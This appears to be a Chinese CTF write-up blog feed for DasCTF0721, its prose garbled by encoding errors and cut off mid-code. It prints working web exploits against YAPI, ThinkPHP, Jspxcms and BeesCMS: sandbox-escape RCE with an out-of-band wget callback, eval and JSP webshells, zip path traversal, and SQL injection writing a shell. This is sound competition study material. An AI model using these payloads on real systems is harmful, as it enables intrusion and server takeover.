&lt;p>Â∞±ÊòØÊâìÊòüÂè∑ÁöÑÈ¢òÊ∂âÂèäÂà∞ÁöÑjsÂéüÂûãÊ±°ÊüìÈóÆÈ¢òÔºåÂÖâÈù†Ëøô‰∏Ä‰∏§‰∏™È¢òÊêû‰∏çÂ§™ÊáÇÔºå‰ΩÜÊòØÊúÄËøëÁöÑÂèçÂ∫èÂàóÂåñÈóÆÈ¢òËøòÊ≤°ÊÄªÁªìÂÆåÔºå‰∏âÂøÉ‰∫åÊÑèÁöÑ‰πü‰∏çÂ§™Â•ΩÔºå‰ΩÜÊòØ‰πãÂêé‰∏ÄÂÆö‰ºöÂõûÊù•ÁúãÁöÑÔºÅÔºÅÔºÅÁ≠âÁùÄË¢´Èû≠Â∞∏Âêß Âìº&lt;/p></description></item><item><title>DasCTF0721 Wp</title><link>https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/</link><pubDate>Thu, 05 Aug 2021 23:15:47 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/</guid><description>&lt;h2 id="cat-flag">cat flag&lt;/h2>
&lt;blockquote>
&lt;p>ÁÆÄÁÆÄÂçïÂçïcat flag&lt;/p>
&lt;p>Hint: ÁÆ°ÁêÜÂëòÊõæËÆøÈóÆËøáflag&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">escapeshellarg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;cat &amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÊèêÁ§∫ÁÆ°ÁêÜÂëòËÆøÈóÆËøáÔºåÂÖà&lt;code>cat /var/log/nginx/access.log&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210802142131657.png" alt="image-20210802142131657">&lt;/p>
&lt;p>‰πãÂêéÁî®&lt;code>%fa&lt;/code>ÁªïËøá &lt;code>/?cmd=this_is_final_fl%faag_e2a457126032b42d.php&lt;/code>&lt;/p>
&lt;p>review - &lt;strong>Nginx ÈáçË¶ÅÊñá‰ª∂ÁõÆÂΩïÔºö&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>ÈÖçÁΩÆÊñá‰ª∂Â≠òÊîæÁõÆÂΩïÔºö/etc/nginx&lt;/li>
&lt;li>‰∏ªË¶ÅÈÖçÁΩÆÊñá‰ª∂Ôºö/etc/nginx/conf/nginx.conf&lt;/li>
&lt;li>ÁÆ°ÁêÜËÑöÊú¨Ôºö/usr/lib64/systemd/system/nginx.service&lt;/li>
&lt;li>Ê®°ÂùóÔºö/usr/lisb64/nginx/modules&lt;/li>
&lt;li>Â∫îÁî®Á®ãÂ∫èÔºö/usr/sbin/nginx&lt;/li>
&lt;li>Á®ãÂ∫èÈªòËÆ§Â≠òÊîæ‰ΩçÁΩÆÔºö/usr/share/nginx/html&lt;/li>
&lt;li>Êó•ÂøóÈªòËÆ§Â≠òÊîæ‰ΩçÁΩÆÔºö/var/log/nginx/access.log&lt;/li>
&lt;/ul>
&lt;h2 id="ezrce">ezrce&lt;/h2>
&lt;blockquote>
&lt;p>‰Ω†ÁúüÁöÑ‰ºö nodejs ÂêóÔºü&lt;/p>
&lt;/blockquote>
&lt;p>ÊòØ‰∏Ä‰∏™YAPIÁöÑ‰∏ªÈ°µÔºåÊ†πÊçÆÈ¢òÁõÆÈáårceÁöÑÊèêÁ§∫ ÊêúÊêúÁúãÂ∑≤Áü•ÁöÑÊºèÊ¥ûÔºö&lt;a href="https://blog.csdn.net/XavierDarkness/article/details/118662886">Yapi Â≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û&lt;/a>&lt;/p>
&lt;p>ÈÇ£Â∞±Â•ΩÂäû‰∫Ü Ë∑üÁùÄÊù•Â∞±Ë°åÂíØÔºõÈ¶ñÂÖàÂàõÂª∫‰∏Ä‰∏™È°πÁõÆ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731153231688.png" alt="image-20210731153231688">&lt;/p>
&lt;p>‰πãÂêé‰øÆÊîπÂÖ®Â±ÄmockËÑöÊú¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">ObjectConstructor&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">FunctionConstructor&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ObjectConstructor&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">myfun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">FunctionConstructor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;return process&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">process&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">myfun&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">mockjson&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mainModule&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">execSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;command&amp;#34;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰πãÂêéÊ∑ªÂä†Êé•Âè£&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731154705721.png" alt="image-20210731154705721">&lt;/p>
&lt;p>ËÑöÊú¨‰∏≠ÁöÑexecSync()Â§ÑÂèØrceÔºåÂÖàÁî®&lt;code>wget http://xxxxx.burpcollaborator.net&lt;/code>ËØïËØïÊ∞¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731154732738.png" alt="image-20210731154732738">&lt;/p>
&lt;p>ÂæàÈ°∫Âà©Âòõ Â•ΩËÄ∂ÔºÅ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">cat &lt;span style="color:#d88200">`&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // spawnSync /bin/sh ENOBUFS
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../&lt;span style="color:#111">;&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // config.json, init.lock, log, vendors
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // app, bin, boot, dev, etc, ffffffflllllaggggg, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, start.sh, tmp, usr, var
&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>cat &lt;span style="color:#d88200">`&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // app, bin,boot, dev, etc, home, lib, lib64, media, mnt,opt, proc, root, run, sbin, srv, sys, tmp, usr, var
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>cat ffffffflllllaggggg&lt;span style="color:#d88200">`&lt;/span> // flag&lt;span style="color:#f92672">{&lt;/span>5d096f4f-8c32-49b6-bed4-b485eb1cf08b&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="easythinkphp">easythinkphp&lt;/h2>
&lt;blockquote>
&lt;p>easythinkphp&lt;/p>
&lt;/blockquote>
&lt;p>Âè™Êúâ‰∏Ä‰∏™thinkphp 3.2.3ÁöÑÊ¨¢ËøéÈ°µÈù¢ÔºåtpÁöÑÊ¥ûÂæàÂ§ö ÂèØ‰ª•Áõ¥Êé•ÊãøÊù•ÊâìÔºåÂèÇËÄÉÔºö&lt;a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">„ÄêÊºèÊ¥ûÈÄöÊä•„ÄëThinkPHP3.2.x RCEÊºèÊ¥ûÈÄöÊä•&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=phpinfo();?&amp;gt;
/index.php?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801011103992.png" alt="image-20210801011103992">&lt;/p>
&lt;p>ÂÖàÈ™åËØÅ‰∏Ä‰∏ãÊñáÊ°£‰∏≠ÁöÑÊñπÊ≥ïÔºåÊàêÂäüÔºå‰πãÂêéÊääphpinfoÊç¢ÊàêËá™Â∑±ÁöÑ‰∏ÄÂè•ËØùÊú®È©¨&lt;/p>
&lt;pre tabindex="0">&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=eval($_POST['wuhu']);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>‰º†ÂÖ•Âêé Áî®ËöÅÂâëËøûÊé•Â∞±ËÉΩÊãøflag‰∫Ü~&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801012307515.png" alt="image-20210801012307515">&lt;/p>
&lt;p>ÊàñËÄÖ‰πüÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®&lt;a href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.2">ThinkphpGUI&lt;/a>‰∏ÄÊääÊ¢≠ÔºÅ‰∏ÄÈîÆgetshell ‰Ω†ÂÄºÂæóÊã•Êúâ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803170035307.png" alt="image-20210803170035307">&lt;/p>
&lt;h2 id="jspxcms">jspxcms&lt;/h2>
&lt;p>‰πüÊúâÁé∞ÊàêÁöÑÊ¥ûÂèØ‰ª•Áõ¥Êé•Áî®ÔºåÂèÇËÄÉÔºö&lt;a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">Â§çÁé∞jspxcmsËß£ÂéãgetshellÊºèÊ¥û&lt;/a> | &lt;a href="https://www.shengchulai.com/blog-NJwAv8oZV1.htm">‰ª£Á†ÅÂÆ°ËÆ°| JspxcmsÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û(CNVD-2019-40540)&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/188788">ËÆ∞‰∏ÄÊ¨°Áî±ËøΩË∏™Ê∫ØÊ∫êÂèëÁé∞ÁöÑ‚Äú‰∏çÂÆâÂÖ®Ëß£Âéãgetshell‚Äù&lt;/a>&lt;/p>
&lt;p>È¶ñÂÖàÊûÑÈÄ†Âê´jspüêéÁöÑÊÅ∂ÊÑèwarÂåÖÔºåüêéÈïøËøôÊ†∑&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%
if(&amp;quot;023&amp;quot;.equals(request.getParameter(&amp;quot;pwd&amp;quot;))){
java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&amp;quot;wuhu&amp;quot;)).getInputStream();
int a = -1;
byte[] b = new byte[2048];
out.print(&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;);
while((a=in.read(b))!=-1){
out.println(new String(b));
}
out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);
}
%&amp;gt;
&lt;/code>&lt;/pre>&lt;p>‰πãÂêéÊîæÂÖ•‰∏Ä‰∏™Ëß£ÂéãÂêé‰ºöËá™Âä®ÂÆåÊàêÁõÆÂΩïÁ©øË∂äÁöÑzipÂåÖ‰∏≠ Ëøô‰∏™ËøáÁ®ãÁî±pyËÑöÊú¨ÂÆåÊàê&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">binary&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;script&amp;gt;alert(&amp;#34;helloworld&amp;#34;)&amp;lt;/script&amp;gt;&amp;#39;&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test123.zip&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZIP_DEFLATED&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipInfo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test123.zip&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">writestr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;../../../../dog123.html&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">binary&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">IOError&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">e&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>
&lt;span style="color:#111">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test123.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZIP_DEFLATED&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;wuhu.war&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">z&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">writestr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;../../../../wuhu.war&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">z&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØ ÊúÄÁªàÊàë‰ª¨Ë¶ÅÁ©øË∂äÂà∞ÁöÑÁõÆÂΩïÊòØÁΩëÁ´ôÊ†πÁõÆÂΩïÁöÑ‰∏äÂ±ÇÔºåÂç≥webappsÁõÆÂΩï‰∏ã ‰∏éROOTÁõÆÂΩïÂêåÁ∫ßÔºåÂΩìwarÂåÖ‰Ωç‰∫éËøô‰∏™ÁõÆÂΩï‰∏ãÊâç‰ºöËá™Âä®ÈÉ®ÁΩ≤&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801013622428.png" alt="image-20210801013622428">&lt;/p>
&lt;p>Áõ¥Êé•&lt;code>cat /flag&lt;/code>Â∞±Â•ΩÂï¶&lt;/p>
&lt;h2 id="cybercms">cybercms&lt;/h2>
&lt;blockquote>
&lt;p>ËµõÂçöCMSÔºåÂè™‰∏∫ÂÆâÂÖ®ËÄåÁîü&lt;/p>
&lt;p>HintÔºö‰ø°ÊÅØÊêúÈõÜÊòØ‰∏Ä‰∏™webÊâãÂøÖÂ§áÁöÑÊäÄËÉΩ&lt;/p>
&lt;/blockquote>
&lt;p>‰∏Ä‰∏™Ôºà‰º™ÔºâcmsÂπ≥Âè∞‰ªãÁªçÁöÑÈ°µÈù¢ÔºåÊØîËæÉÁÆÄÈôãÔºåÈ¶ñÈ°µ/Â∫îÁî®Ê°à‰æãÂ§ÑÊòæÁ§∫hacked by ymnhÔºåÂú®ymnhÁöÑÂí®ËØ¢È°µÈù¢Â§ÑÊúâËøôÊ†∑ÁöÑÊä•Èîô&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801031306740.png" alt="image-20210801031306740">&lt;/p>
&lt;p>Âú®È¶ñÈ°µ/Êñ∞ÈóªÂä®ÊÄÅÂ§ÑÔºåÂá†‰πéÊâÄÊúâÁöÑÂ∏ñÂ≠êÈÉΩÊòØhacked by xxx~~ÔºàÊú¨Êù•ÊàëËøò‰ª•‰∏∫ÊòØÂ§ö‰πàÂ§çÊùÇÁöÑÈïøÁØáÂ§ßËÆ∫Ôºâ~~ÔºåÂú®Â¶Ç‰ΩïÂÆâË£ÖÂíå‰ΩøÁî®Ê®°ÊùøËøôÁØá‰∏ãÊúâÊ≤°Âà†Âπ≤ÂáÄÁöÑ‰∏úË•ø&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801031809386.png" alt="image-20210801031809386">&lt;/p>
&lt;p>Â¶Ç‰ΩïËÆæÁΩÆËøõÁ´ôËØ≠Ë®ÄËøôÁØáÈáåÁ´üÁÑ∂ÊòØËøôÊ†∑ÁöÑ&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801032406665.png" alt="image-20210801032406665">&lt;/p>
&lt;p>Ëçâ ÁúüÊòØËöåÂü†‰Ωè‰∫Ü ÂõæÁ©∑ÂåïËßÅ‰∫ÜÂ±û‰∫éÊòØ2333333&lt;/p>
&lt;p>Ê†πÊçÆËøô‰∫õÔºåÂèØ‰ª•ÂæóÁü•Êï¥‰∏™Á´ôÊòØÂÆåÂÖ®ÁßªÊ§ç/Â•óÂ£≥beescmsÁöÑ ÊâÄ‰ª•Êé•ÁùÄÂéªÊâæÂ∑≤Â≠òÂú®ÁöÑÊ¥ûÔºåÂèÇËÄÉÔºö&lt;a href="https://www.cnblogs.com/yuzly/p/11423384.html">Beescms_v4.0 sqlÊ≥®ÂÖ•ÊºèÊ¥ûÂàÜÊûê&lt;/a>&lt;/p>
&lt;p>Âú®adminÂêéÂä†ÂçïÂºïÂè∑ÔºåÊèêÁ§∫&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801113627407.png" alt="image-20210801113627407">&lt;/p>
&lt;p>Ë°®ÂêçÊòØbees_adminÔºåÊúâid, admin_name, admin_password, admin_purview, is_disableÂÖ±5‰∏™Â≠óÊÆµ&lt;/p>
&lt;p>ÁÆÄÂçïfuzzÂèØÁü•ÔºöËøáÊª§‰∫ÜÁ©∫Ê†ºÔºàÁî®&lt;code>/**/&lt;/code>ÁªïËøáÔºâÔºàÊàñËÄÖÁî®&lt;code>tab&lt;/code>ÁªïËøá ÊàñËÄÖ&lt;code>%0a&lt;/code>ÁªïËøá ÈÉΩÂèØ‰ª•ÔºâÔºåËøáÊª§‰∫Üselect, outfileÔºàÂèåÂÜôÁªïËøáÔºâÔºåÂØπÂ∞ñÊã¨Âè∑ËΩ¨‰πâ‰∏∫htmlÂÆû‰ΩìÔºàÁî®hexÁªïËøáÔºâ&lt;/p>
&lt;pre tabindex="0">&lt;code>user=admin'/**/union/**/selselectect/**/1,2,3,4,5#
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121138555.png" alt="image-20210801121138555">&lt;/p>
&lt;p>ÂõûÊòæÊ≠£Â∏∏ÔºåÊé•ÁùÄÂ∞ùËØïÂÜôÂÖ•shellÔºàËøôÈáåË¶ÅÂÜôÊ∏ÖÊ•öÁªùÂØπË∑ØÂæÑÔºåÂú®‰∏äÈù¢ÁöÑ‰∏ÄÂº†Êä•ÈîôÁöÑÈ°µÈù¢‰πüÊúâÊâÄÊèêÁ§∫‰∫ÜÔºâ&lt;/p>
&lt;pre tabindex="0">&lt;code>admin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'#
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121645243.png" alt="image-20210801121645243">&lt;/p>
&lt;p>Â•ΩËÄ∂ÔºåËøûËöÅÂâëÊãøflagÂíØ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121853464.png" alt="image-20210801121853464">&lt;/p>
&lt;h2 id="ez_website">ez_website&lt;/h2>
&lt;blockquote>
&lt;p>ÁÆÄÂçïÁöÑÈ¢òÁõÆ&lt;/p>
&lt;/blockquote>
&lt;p>‰πüÊòØÁé∞ÂÆû‰∏ñÁïåÂ≠òÂú®ÁöÑ‰∏úË•øÔºåÂèÇËÄÉÔºö&lt;a href="https://ma4ter.cn/2527.html">ÈΩêÂçöÂª∫Á´ôÁ≥ªÁªüx1.0‰ª£Á†ÅÂÆ°ËÆ°&lt;/a>&lt;/p>
&lt;p>Áõ¥Êé•Áî®Â∑≤ÊúâÁöÑÈìæÂ≠êÊâì&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\process\pipes&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Windows&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#75715e">//$file =&amp;gt; /think/ModelÁöÑÂ≠êÁ±ªnew Pivot(); ModelÊòØÊäΩË±°Á±ª
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think&lt;/span> &lt;span style="color:#111">{&lt;/span>
